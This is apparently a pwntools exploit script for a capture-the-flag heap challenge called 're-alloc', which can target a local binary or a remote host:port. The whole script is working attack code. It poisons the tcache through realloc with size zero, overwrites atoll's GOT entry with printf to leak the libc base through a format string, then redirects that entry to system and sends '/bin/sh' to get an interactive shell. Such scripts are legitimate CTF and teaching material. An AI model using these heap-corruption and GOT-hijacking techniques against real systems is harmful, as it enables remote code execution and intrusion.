#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64", log_level="debug")
localfile = "./re-alloc"
locallibc = "libc.so.6"
pf      = lambda name,num           :log.info(name + ": 0x%x" % num)
g       = lambda x                  :next(libc.search(asm(x)))

def allocate(idx, size, data):
    io.recvuntil("Your choice: ")
    io.sendline("1")
    io.recvuntil("Index:")
    io.sendline(str(idx))
    io.recvuntil("Size:")
    io.sendline(str(size))
    io.recvuntil("Data:")
    io.send(data)

def realloc(idx, size, data):
    io.recvuntil("Your choice: ")
    io.sendline("2")
    io.recvuntil("Index:")
    io.sendline(str(idx))
    io.recvuntil("Size:")
    io.sendline(str(size))
    if size != 0:
        io.recvuntil("Data:")
        io.send(data)

def free(idx):
    io.recvuntil("Your choice: ")
    io.sendline("3")
    io.recvuntil("Index:")
    io.sendline(str(idx))

def exp():
    atoll_got = elf.got["atoll"]
    printf_plt = elf.plt["printf"]
    system_off = libc.sym["system"]

    allocate(0, 0x18, "A")
    realloc(0, 0, "")
    realloc(0, 0x18, p64(atoll_got))
    allocate(1, 0x18, "A")
    realloc(0, 0x28, "A")
    free(0)
    realloc(1, 0x28, "A"*0x10)
    free(1)

    allocate(0, 0x38, "A")
    realloc(0, 0, "")
    realloc(0, 0x38, p64(atoll_got))
    allocate(1, 0x38, "A")
    realloc(0, 0x48, "A")
    free(0)
    realloc(1, 0x48, "A"*0x10)
    free(1)

    allocate(0, 0x18, p64(printf_plt))
    io.sendlineafter("Your choice: ", "1")
    io.sendlineafter("Index:", "Z%23$llx\n")
    io.recvuntil("Z")
    libc_base = int(io.recvline().strip(b"\n"), 16) - 0x26B6B
    pf("libc base", libc_base)
    system_addr = libc_base + system_off

    io.sendlineafter("Your choice: ", "1")
    # gdb.attach(io, "b read_long")
    io.sendlineafter("Index:", "A\x00")
    io.sendlineafter("Size:", "%55x")
    io.sendlineafter("Data:", p64(system_addr))

    io.sendlineafter("Your choice: ", "1")
    io.sendlineafter("Index:", "/bin/sh")
    
    io.interactive()


argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

elf = ELF(localfile)
libc = ELF(locallibc)
exp()
